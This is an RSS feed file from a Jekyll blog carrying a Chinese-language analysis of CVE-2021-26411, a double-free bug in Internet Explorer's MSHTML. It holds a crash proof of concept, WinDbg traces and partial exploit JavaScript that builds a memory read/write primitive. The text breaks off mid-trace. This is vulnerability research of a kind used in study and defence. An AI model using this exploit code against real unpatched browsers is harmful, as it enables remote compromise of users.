@@ -1,0 +1,2039 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Joey</title>
+    <description></description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Thu, 07 Jul 2022 21:01:14 +0800</pubDate>
+    <lastBuildDate>Thu, 07 Jul 2022 21:01:14 +0800</lastBuildDate>
+    <generator>Jekyll v4.2.2</generator>
+    
+      <item>
+        <title>CVE-2021-26411漏洞分析</title>
+        <description>&lt;h1 id=&quot;漏洞信息&quot;&gt;漏洞信息&lt;/h1&gt;
+
+&lt;p&gt;CVE：CVE-2021-26411&lt;/p&gt;
+
+&lt;p&gt;IE版本：IE 9-11&lt;/p&gt;
+
+&lt;p&gt;漏洞类型：Double free&lt;/p&gt;
+
+&lt;p&gt;漏洞模块：MSHTML.dll&lt;/p&gt;
+
+&lt;h1 id=&quot;漏洞成因&quot;&gt;漏洞成因&lt;/h1&gt;
+
+&lt;p&gt;POC：&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;elem&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;xxx&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;attr1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;yyy&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;attr2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;zzz&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+
+&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;valueOf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clearAttributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1337&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;attr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nodeValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;attr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;nodeValue&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttributeNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttributeNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attr2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;elem&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;removeAttributeNode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;attr1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在windbg中调试发现崩溃于CAttrValue::GetDISPID中，栈回溯发现漏洞发生于ie9_removeAttributeNodeInternal函数中，于是重新在此下断：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_9-44-45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;查看IDA反汇编代码，发现传入6个参数，而this指针是通过ECX寄存器传递的：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-2-7_17-11-9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此下断在此直接查看ecx的CElement结构，CElement+0x10处为CAttrArray所在地址，CAttrArray内存储了5个CAttrValue结构，该结构指向的正是elem、attr1 和attr2：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_10-36-25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着通过调用两次CBase::FindAAIndexNS函数获取了attr1和attr1.ValueOf在CAttrArray中的序号：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_10-56-15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;将获取到的CAttr[1]的序号和vtType传入GetObjectAt函数获取CAttr[1]：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-9-52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;接着调用GetIntoBSTRAt将CAttr[1].ValueOf转化为BSTR：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-12-14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;执行完后查看CAttrArray发现elem中全部被attr2覆盖，说明在GetIntoBSTRAt函数内执行了attr1的回调函数，调用了clearAttributes将elem内的Attr对象全部释放：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_12-1-37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;跟进调试发现GetIntoBSTRAt内调用了JavascriptDispatch::InvokeOnSelf，最终调用CElement::clearAttributes把attr1和attr2清除：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_14-17-52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;执行完回调函数后会接着执行CAttrArray::Destroy来释放attr1，但是此时CAttrArray数组中被attr2覆盖，执行完毕后attr2从内存中释放：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-20-43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;当执行到CBase::FindAAIndexNS时，Attr2已经被释放，获取Index时出错返回-1：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-23-31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此在执行下一个CAttrArray::Destroy时触发Double Free，会将-1当作Index释放CAttr[-1]的对象，获取了一个非法的对象：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image2022-1-26_15-36-29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;因此，要想构造读写原语需要占用被释放后的attr2的内存空间，同时需要向elem中添加Attribute避免CBase::FindAAIndexNS获取到非法的下标。&lt;/p&gt;
+
+&lt;h1 id=&quot;漏洞利用&quot;&gt;漏洞利用&lt;/h1&gt;
+
+&lt;h2 id=&quot;构造读写原语&quot;&gt;构造读写原语&lt;/h2&gt;
+
+&lt;p&gt;构造读写原语部分EXP如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function pad0(str) {
+    return (&apos;0000&apos; + str).slice(-4)
+}
+
+function alloc1() {
+    var view = new DataView(abf)
+    var str = &apos;&apos;
+    for (var i = 4; i &amp;lt; abf.byteLength - 2; i += 2)
+        str += &apos;%u&apos; + pad0(view.getUint16(i, true).toString(16))
+    var result = document.createAttribute(&apos;alloc&apos;)
+    result.nodeValue = unescape(str)
+    return result
+}
+
+function alloc2() {
+    var dic1 = new ActiveXObject(&apos;Scripting.Dictionary&apos;)
+    var dic2 = new ActiveXObject(&apos;Scripting.Dictionary&apos;)
+    dic2.add(0, 1)
+    dic1.add(0, dic2.items())
+    dic1.add(1, fake)
+    dic1.add(2, arr)
+    for (i = 3; i &amp;lt; 0x20010 / 0x10; ++i)
+        dic1.add(i, 0x12341234)
+    return dic1.items()
+}
+
+var god
+var arr = [{}]
+var fake = new ArrayBuffer(0x100)	//伪造的write-what-where读写原语
+var abf = new ArrayBuffer(0x20010)	
+var alloc = alloc2()				//替换ArrayBuffer的Scripting.Dictionary对象结构
+var hd0 = document.createAttribute(&apos;handle&apos;)
+var hd1 = document.createAttribute(&apos;handle&apos;)
+var hd2
+var ele = document.createElement(&apos;element&apos;)		//element对象，内有attribute回调函数和attr字符串数组
+var att = document.createAttribute(&apos;attribute&apos;)
+att.nodeValue = {
+    valueOf: function() {
+        hd1.nodeValue = (new alloc1()).nodeValue
+        ele.clearAttributes()
+        hd2 = hd1.cloneNode()					//执行完该语句，attr字符串已经被替换为ArrayBuffer abf
+        ele.setAttribute(&apos;attribute&apos;, 1337)		//执行该语句是为了让CBase::FindAAIndexNS获取到正确的下标，导致被替换后的attr再次被释放
+    }
+}
+ele.setAttributeNode(att)
+ele.setAttribute(&apos;attr&apos;, &apos;0&apos;.repeat((0x20010 - 6) / 2))
+ele.removeAttributeNode(att)	//执行该语句，首先会执行attribute回调函数，接着执行removeAttributeNode
+hd0.nodeValue = alloc			//随后将被释放的attr替换为dic1.items
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;下断在jscript9!Js::JavascriptArrayBuffer::Create，执行完毕后查看ArrayBuffer：fake和abf的结构，获得fake和abf的内存布局：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:020&amp;gt; bp jscript9!Js::JavascriptArrayBuffer::Create
+breakpoint 0 redefined
+0:020&amp;gt; g
+Breakpoint 0 hit
+eax=00000100 ebx=095b4bc0 ecx=00000100 edx=08dcc8c0 esi=05d46568 edi=05d46568
+eip=737893d0 esp=05cec964 ebp=05cec980 iopl=0         nv up ei pl nz na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000207
+jscript9!Js::JavascriptArrayBuffer::Create:	 	//var fake = new ArrayBuffer(0x100)	
+737893d0 8bff            mov     edi,edi
+0:009&amp;gt; gu
+eax=0963fed0 ebx=095b4bc0 ecx=00000000 edx=00000078 esi=05d46568 edi=05d46568
+eip=739b7f03 esp=05cec968 ebp=05cec980 iopl=0         nv up ei pl nz ac po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
+jscript9!Js::ArrayBuffer::NewInstance+0xb3:
+739b7f03 5f              pop     edi
+0:009&amp;gt; dpp eax L9			//fake的ArrayBuffer结构
+0963fed0  7370514c 7378ac10 jscript9!Js::JavascriptArrayBuffer::Finalize
+0963fed4  08dcc8c0 00000020
+0963fed8  00000000
+0963fedc  00000000
+0963fee0  00000000
+0963fee4  00000000
+0963fee8  00000000
+0963feec  05d4d338 00000000	//+0x1c为Buffer所在地址
+0963fef0  00000100			//+0x20为BufferLenth
+0:009&amp;gt; g
+Breakpoint 0 hit
+eax=00020010 ebx=095b4bc0 ecx=00020010 edx=08dcc8c0 esi=05d46568 edi=05d46568
+eip=737893d0 esp=05cec964 ebp=05cec980 iopl=0         nv up ei pl nz na po cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000203
+jscript9!Js::JavascriptArrayBuffer::Create:	 //var abf = new ArrayBuffer(0x20010)
+737893d0 8bff            mov     edi,edi
+0:009&amp;gt; gu
+eax=0963ff00 ebx=095b4bc0 ecx=00000000 edx=00000008 esi=05d46568 edi=05d46568
+eip=739b7f03 esp=05cec968 ebp=05cec980 iopl=0         nv up ei pl nz ac po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000212
+jscript9!Js::ArrayBuffer::NewInstance+0xb3:
+739b7f03 5f              pop     edi
+0:009&amp;gt; dpp eax L9	 		//abf的ArrayBuffer结构
+0963ff00  7370514c 7378ac10 jscript9!Js::JavascriptArrayBuffer::Finalize
+0963ff04  08dcc8c0 00000020
+0963ff08  00000000
+0963ff0c  00000000
+0963ff10  00000000
+0963ff14  00000000
+0963ff18  00000000
+0963ff1c  05d61fe8 00000000 //+0x1c为Buffer所在地址
+0963ff20  00020010		 	//+0x20为BufferLenth
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;此时在Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b处下断，该函数为对象函数调用处，可以看到hd0，hd1和ele在内存中的布局：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:009&amp;gt; bp Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b
+0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
+eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var hd0 = document.createAttribute(&apos;handle&apos;)
+0:009&amp;gt; p
+eax=0a2f9cf0 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
+eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
+73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
+0:009&amp;gt; dd poi(eax+18) L10	//hd0
+05387200  715961ec 00000001 00000001 00000008
+05387210  00000000 00000000 0a2f9cf0 00000000
+05387220  ffffffff 093b32c4 00000008 00000000
+05387230  00000000 00000000 05382370 00000000
+0:009&amp;gt; du 093b32c4 
+093b32c4  &quot;handle&quot;
+0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
+eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var hd1 = document.createAttribute(&apos;handle&apos;)
+0:009&amp;gt; p
+eax=0a2f9d20 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
+eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
+73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
+0:009&amp;gt; dd poi(eax+18) L10	//hd1
+05387260  715961ec 00000001 00000001 00000008
+05387270  00000000 00000000 0a2f9d20 00000000
+05387280  ffffffff 093b31e4 00000008 00000000
+05387290  00000000 00000000 05382370 00000000
+0:009&amp;gt; du 093b31e4 
+093b31e4  &quot;handle&quot;
+0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e408092 ebx=00ebd201 ecx=72040490 edx=00040000 esi=02000002 edi=00000002
+eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CDocument::Trampoline_createElement (72040490)}	//var ele = document.createElement(&apos;element&apos;)
+0:009&amp;gt; p
+eax=0a2f9d50 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
+eip=73869e6e esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
+73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec9b4=05cec98c
+0:009&amp;gt; dd poi(eax+18) L8	//ele
+05382b40  715f5670 00000001 00000001 00000008
+05382b50  05378a70 00000000 0a2f9d50 00000000
+0:009&amp;gt; dd 05378a70 L4		//CAttrArray
+05378a70  00000010 00000001 0541f580 00000000
+0:009&amp;gt; dd 0541f580 L1*4		//CAtrrValue
+0541f580  80000d04 8001141f 05384bc0 05cec4dc
+0:009&amp;gt; du poi(05384bc0+8)
+093b2fc4  &quot;element&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;当执行到removeAttributeNode时，ele内已经存放了attribute回调函数和attr字符串数组：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e409f2c ebx=00ebd201 ecx=7204f960 edx=00001000 esi=10000002 edi=00000002
+eip=73869e6b esp=05cec978 ebp=05cec9e0 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec9c8={MSHTML!CFastDOM::CElement::Trampoline_removeAttributeNode (7204f960)}	//ele.removeAttributeNode(att)
+0:009&amp;gt; dd 05382b40 L8
+05382b40  715f5670 00000001 00000001 00000010
+05382b50  05378a70 00000000 0a2f9d50 00000000
+0:009&amp;gt; dd 05378a70 L4
+05378a70  00000010 00000004 0541f580 08954440
+0:009&amp;gt; dd 0541f580 L4*4
+0541f580  80000d04 8001141f 05384bc0 05cec4dc	//elemengt
+0541f590  80000901 002dc6c1 09649b84 00000020	//attribute.nodeValue
+0541f5a0  80000d09 002dc6c1 053872c0 05cec824	//attribute
+0541f5b0  80000801 002dc6c2 0943b5b4 00000020	//attr
+0:009&amp;gt; du poi(053872c0+24) 
+093b3284  &quot;attribute&quot;
+0:009&amp;gt; dd 0943b5b4-4	//attr
+0943b5b0  0002000a 00300030 00300030 00300030
+0943b5c0  00300030 00300030 00300030 00300030
+0943b5d0  00300030 00300030 00300030 00300030
+0943b5e0  00300030 00300030 00300030 00300030
+0943b5f0  00300030 00300030 00300030 00300030
+0943b600  00300030 00300030 00300030 00300030
+0943b610  00300030 00300030 00300030 00300030
+0943b620  00300030 00300030 00300030 00300030
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;接着在执行removeAttributeNode时，会调用att的回调函数，执行函数alloc1()，将ArrayBuffer：abf复制到hd1.nodeValue：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e407f58 ebx=00ebd201 ecx=7203fac0 edx=01000100 esi=02000002 edi=00000002
+eip=73869e6b esp=05cec068 ebp=05cec0d0 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec0b8={MSHTML!CFastDOM::CDocument::Trampoline_createAttribute (7203fac0)}	//var result = document.createAttribute(&apos;alloc&apos;)
+0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
+eip=73869e6b esp=05cebfc0 ebp=05cec024 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec00c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}	//result.nodeValue = unescape(str)
+0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e40dd64 ebx=00ebd201 ecx=7206eb20 edx=40000010 esi=02000001 edi=00000001
+eip=73869e6b esp=05cec1d8 ebp=05cec23c iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec224={MSHTML!CFastDOM::CNode::Trampoline_Get_nodeValue (7206eb20)}
+0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e411fda ebx=00ebd201 ecx=7208fed0 edx=04001000 esi=02000002 edi=00000002
+eip=73869e6b esp=05cec230 ebp=05cec294 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec27c={MSHTML!CFastDOM::CNode::Trampoline_Set_nodeValue (7208fed0)}	//hd1.nodeValue = (new alloc1()).nodeValue
+0:009&amp;gt; dd 05387260 L10	//hd1，此时hd1.nodeValue还未赋值
+05387260  715961ec 00000001 00000001 00000008
+05387270  00000000 00000000 0a2f9d20 00000000
+05387280  ffffffff 093b31e4 00000008 00000000
+05387290  00000000 00000000 05382370 00000000
+0:009&amp;gt; p
+eax=00000000 ebx=00ebd201 ecx=73783070 edx=41004000 esi=02000002 edi=00000002
+eip=73869e6e esp=05cec230 ebp=05cec294 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200246
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18e:
+73869e6e 8b65d4          mov     esp,dword ptr [ebp-2Ch] ss:002b:05cec268=05cec240
+0:009&amp;gt; dd 05387260 L10	//hd1
+05387260  715961ec 00000001 00000001 00000008
+05387270  00000000 00000000 0a2f9d20 00000000
+05387280  ffffffff 093b31e4 00000008 00000000
+05387290  094a200c 00000000 05382370 00000000
+0:009&amp;gt; dd 094a200c-4	//abf已经复制到了hd1.nodeValue
+094a2008  0002000a 00000000 00000000 00000000
+094a2018  00000000 00000000 00000000 00000000
+094a2028  00000000 00000000 00000000 00000000
+094a2038  00000000 00000000 00000000 00000000
+094a2048  00000000 00000000 00000000 00000000
+094a2058  00000000 00000000 00000000 00000000
+094a2068  00000000 00000000 00000000 00000000
+094a2078  00000000 00000000 00000000 00000000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;执行完毕clearAttributes后，ele内的元素被清除，attr所占用的内存空间也会被清理，当执行完hd1.cloneNode()后，attr所占用的内存空间变成了hd1.nodeValue，此时获得了hd2.nodeValue这个0x20100大小的读写原语：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0:009&amp;gt; g
+Breakpoint 0 hit
+eax=0e407d10 ebx=00ebd201 ecx=7203e880 edx=40010004 esi=10000001 edi=00000001
+eip=73869e6b esp=05cec2e0 ebp=05cec340 iopl=0         nv up ei pl zr na pe cy
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200247
+jscript9!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x18b:
+73869e6b ff55e8          call    dword ptr [ebp-18h]  ss:002b:05cec328={MSHTML!CFastDOM::CHTMLElement::Trampoline_clearAttributes (7203e880)}	//ele.clearAttributes()
+0:009&amp;gt; dd 05378a70 L4
+05378a70  00000010 00000004 0541f580 08954440
+0:009&amp;gt; dd 0541f580 L4*4		//此时CAttr中的元素还未被清除
+0541f580  80000d04 8001141f 05384bc0 05cec4dc
